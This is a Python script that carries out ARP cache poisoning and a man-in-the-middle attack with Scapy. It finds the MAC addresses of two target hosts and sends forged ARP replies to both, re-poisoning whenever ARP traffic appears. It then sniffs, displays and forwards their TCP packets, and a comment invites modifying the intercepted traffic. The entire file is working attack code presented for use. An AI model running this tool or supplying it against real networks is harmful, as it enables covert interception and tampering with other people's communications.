#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by Maxwell Bland around 07-06-2018
# Given the targets, the network interface, and a bit of luck, this will
# perform a MITM Attack on given IPs using Scapy, and filter the packets
# through the handlePacket function. If you check the "send" function call
# in that function, this is where you would do all you packet modification
# junk or whatever.

"""
ARP cache poisoning and MITM attack implementation using Scapy.
"""

from argparse import ArgumentParser
from os import geteuid
from scapy.all import *
from subprocess import call
from sys import exit as sysexit
from time import sleep
import netifaces as ni

class Pestilence:
  def __init__(self, interface, targetA, targetB):
    self.interface = interface
    self.conASeq = 0
    self.conBSeq = 0
    self.trgtA = targetA
    self.trgtB = targetB
    self.MAC = get_if_hwaddr(interface)
    self.IP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=targetA),
                     iface=interface, timeout=2)
    self.trgtAMac = ans[0][1][ARP].hwsrc
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=targetB),
                     iface=interface, timeout=2)
    self.trgtBMac = ans[0][1][ARP].hwsrc

  def initiate(self):
    self.arp_poison()
    sn = sniff(iface=self.interface, prn=lambda x: self.handlePacket(x))
    wireshark(sn)

  def arp_poison(self):
    aToBPoison = ARP(
      op=2,
      psrc=self.trgtA,
      pdst=self.trgtB,
      hwdst=self.trgtBMac
      )
    bToAPoison = ARP(
      op=2,
      psrc=self.trgtB,
      pdst=self.trgtA,
      hwdst=self.trgtAMac
      )
    send(aToBPoison, iface=self.interface)
    send(bToAPoison, iface=self.interface)

  def handleArpPacket(self, pkt):
    """
    Takes an arp packet, if it was a reply packet from one of the targets,
    we repoison the cache
    """
    # arp = pkt[ARP]
    # pdst = arp.pdst
    # hwsrc = arp.hwsrc
    self.arp_poison()

  def handlePacket(self, pkt):
    if TCP in pkt:
      # TODO: worry about wrap around on ack numbers
      if (pkt.src == self.trgtAMac and
          self.conBSeq + len(pkt[TCP].payload) == pkt[TCP].ack ):
        self.conBSeq = pkt[TCP].ack
      if (pkt.src == self.trgtBMac and
          self.conASeq + len(pkt[TCP].payload) == pkt[TCP].ack ):
        self.conASeq = pkt[TCP].ack
      if (pkt.src == self.trgtAMac):
        pkt.show()
        if (pkt[TCP].seq == self.conASeq ):
          send(pkt[IP], iface=self.interface)
      if (pkt.src == self.trgtBMac):
        pkt.show()
        if (pkt[TCP].seq == self.conBSeq):
          send(pkt[IP], iface=self.interface)
    if ARP in pkt:
      self.handleArpPacket(pkt)

if __name__ == "__main__":
    ap = ArgumentParser(
      description="MITM Attack on given IPs using Scapy"
      )
    ap.add_argument("-i", "--interface", required=True,
                    help="network interface to use")
    ap.add_argument("-t", "--targets", required=True, nargs=2,
                    help="target's IP address")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        sysexit("sudo dummy")

    call(("iptables -A INPUT -i %s -p tcp -j DROP" %
          (args['interface']))
         .split(' '))

    try:
        print("Starting...")
        pest = Pestilence(
          args["interface"],
          *args["targets"] )
        pest.initiate()
    except IOError:
        sysexit("Interface doesn't exist")
    except KeyboardInterrupt:
        print("\nStopping...")

    call("iptables -F INPUT".split(' '))
